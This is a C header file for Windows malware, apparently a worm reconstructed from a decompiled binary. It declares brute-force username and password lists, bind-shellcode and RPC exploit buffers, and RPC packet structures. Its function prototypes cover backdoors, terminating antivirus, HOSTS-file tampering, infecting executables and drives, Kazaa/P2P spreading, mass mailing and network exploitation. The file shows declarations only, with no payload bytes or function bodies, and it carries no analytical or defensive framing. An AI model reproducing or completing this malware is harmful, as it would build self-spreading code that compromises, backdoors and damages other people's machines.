#ifndef DATA_GLOBALS_H
#define DATA_GLOBALS_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <rpc.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <stdbool.h>

/* ------------------- Constants ------------------- */
#define USERS_NUM 11
#define PWD_NUM 70
#define KAZAA_NAMES_COUNT 8
#define BIND_SHELLCODE_SIZE 226
#define POP_SIZE 484
#define EXPLOIT_SIZE 164

/* ------------------- External Arrays (no underscores) ------------------- */
extern char *users_list[USERS_NUM];
extern char *passwords_list[PWD_NUM];

extern const char *AntiVirus[];
extern const char *Inf_Drives[];
extern const char *kazaa_names[];

extern const char HOSTS_f[];           // const char*, not uint8_t
extern unsigned char POP[];            // no underscore
extern unsigned char EXPLOIT[];        // no underscore
extern unsigned char bind_shellcode[]; // no underscore
extern BYTE PRPC[];                    // BYTE, not uint32_t

/* ------------------- Structs for RPC exploit ------------------- */
typedef struct RPCBIND {
    BYTE VerMaj;
    BYTE VerMin;
    BYTE PacketType;
    BYTE PacketFlags;
    DWORD DataRep;
    WORD FragLength;
    WORD AuthLength;
    DWORD CallID;
    WORD MaxXmitFrag;
    WORD MaxRecvFrag;
    DWORD AssocGroup;
    BYTE NumCtxItems;
    WORD ContextID;
    WORD NumTransItems;
    GUID InterfaceUUID;
    WORD InterfaceVerMaj;
    WORD InterfaceVerMin;
    GUID TransferSyntax;
    DWORD SyntaxVer;
} RPCBIND;

typedef struct RPCFUNC {
    BYTE VerMaj;
    BYTE VerMin;
    BYTE PacketType;
    BYTE PacketFlags;
    DWORD DataRep;
    WORD FragLength;
    WORD AuthLength;
    DWORD CallID;
    DWORD AllocHint;
    WORD ContextID;
    WORD Opnum;
} RPCFUNC;

/* ------------------- Function Prototypes ------------------- */
void _AutoStart(BYTE *param_1);
DWORD WINAPI _BackDoor_4(LPVOID Data);
DWORD WINAPI _L0cal_4(LPVOID Data);
void _NetSpread(uint32_t param_1, LPCSTR param_2);
void _Payload(void);
DWORD WINAPI extra(LPVOID Data);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);

DWORD WINAPI _AntiVirusTerminate(void);
int _BindRpcInterface(HANDLE param_1, char *param_2, char *param_3);
uint32_t _CiphChr(uint32_t param_1);
uint32_t _CiphStr(uint8_t* input_str, char* output_str);
DWORD WINAPI _ExploitMain(void);
DWORD WINAPI _FileBackdoor(void);
uint32_t _HOSTSFile(void);
uint32_t _InfectExes(void);   // uint32_t (or int) – match source
uint32_t _Install(void);
void kazaa_spread(LPCSTR param_1);
void p2p_spread(void);
DWORD WINAPI _MassMailMain(void);
void _SearchNDestroy(char *param_1);
void InfectDrives(void);
uint32_t _ExploitIP(char *servip);

#endif /* DATA_GLOBALS_H */
